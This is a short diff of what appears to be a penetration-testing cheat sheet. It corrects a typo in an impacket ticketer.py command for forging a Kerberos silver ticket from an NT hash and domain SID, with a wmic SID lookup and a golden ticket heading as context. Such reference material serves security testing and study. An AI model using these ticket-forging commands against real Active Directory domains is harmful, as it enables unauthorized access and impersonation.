@@ -1150,7 +1150,7 @@ wmic useraccount where name="USER" get sid
 
 #### Silver ticket
 ```shell
-python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain>l <user>
+python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain> <user>
 ```
 #### Golden ticket
 ```shell
